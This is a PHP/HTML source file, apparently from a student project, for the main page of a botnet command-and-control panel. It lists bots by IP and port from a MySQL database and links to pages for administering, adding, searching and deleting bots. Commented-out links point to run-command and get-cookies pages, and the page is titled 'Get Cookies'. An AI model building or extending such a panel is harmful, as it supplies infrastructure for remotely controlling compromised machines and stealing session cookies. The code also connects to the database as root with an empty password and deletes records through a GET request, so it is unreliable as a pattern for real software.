<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Get Cookies</title>
	<link rel="stylesheet" type="text/css" href="../css/index.css">
	<style>
		body {
			font-family: Arial, Helvetica, sans-serif;
			text-align: center;
			background-color: #87ceeb;
			padding: 20px;

		}

		#clienttable {
			text-align: center;
		}

		button {
			padding: 10px;
		}

		table {
			font-family: arial, sans-serif;
			border-collapse: collapse;

			margin-left: auto;
			margin-right: auto;
		}



		td,
		th {
			border: 1px solid #dddddd;
			text-align: left;
			padding: 8px;
		}

		th {
			background-color: #f5f5dc;
		}

		tr {
			background-color: #ffffff;
		}
	</style>
</head>

<body>
	<div id="bottable">
		<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTd-hQ_7nyVLXQ_NJU3MJhCA1JSXravIcUSWh0WHMDE&s" alt="" width="180vw">
		<h2>Main Page</h2>
		<?php
		$db = new mysqli('localhost', 'root', '', 'pbl4');
		if (mysqli_connect_errno()) exit;
		echo '<p>Connected to Command and Control Server</p>';
		$query = "SELECT ID, ip, port FROM botes";
		$stmt = $db->prepare($query);
		$stmt->execute();
		$stmt->bind_result($ID, $ip, $port);

		echo '<table>';
		echo '<tr> <th>ID</th> <th>IP</th> <th>Port</th> <th>Select</th> <th>Delete</th></tr>';
		while ($stmt->fetch()) {
			echo '<tr>';
			$administer = "<a href='../php/openBot.php?ip=" . $ip . "&port=" . $port . "'>administrator</a>";
			// $administer = "<form action='botActive.php' method='post' name=''> <input type='submit' value='administer'> <a href='/PBL4/openBot.php?bot=" . $ip . "'>administer</a> </form>";
			$delete = "<a href='../php/index.php?bot=" . $ip . "'>delete</a>";
			// $update = "<a href='../php/updateBot.php?bot=" . $ip . "'>update</a>";
			// $runCommand = "<a href='../php/runCommand.php?ID=" . $ID . "'>runcommand</a>";
			// $getCookies= "<a href='../php/getCookies.php?ID=" . $ID . "'>getcookies</a>";
			echo '<td>' . $ID . '</td> <td>' . $ip . '</td> <td>' . $port . '</td> <td>' . $administer . '</td> <td>' . $delete . '</td>';
			echo '</tr>';
		}
		echo '</table>';
		?>
		<button><a href="addBot.php">Add Bot</a></button>
		<button><a href="searchBot.php">Search Bot</button>
	</div>

</body>

</html>


<?php
if (isset($_GET['bot']) && !empty($_GET['bot'])) {
	$bot =  $_GET['bot'];
	$db = new mysqli('localhost', 'root', '', 'pbl4');
	if (mysqli_connect_errno()) exit;
	$query = "DELETE FROM botes WHERE ip=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('s', $bot);
	$stmt->execute();
	$db->close();
	echo "bot deleted";
	header("Location: ../php/index.php");
}
?>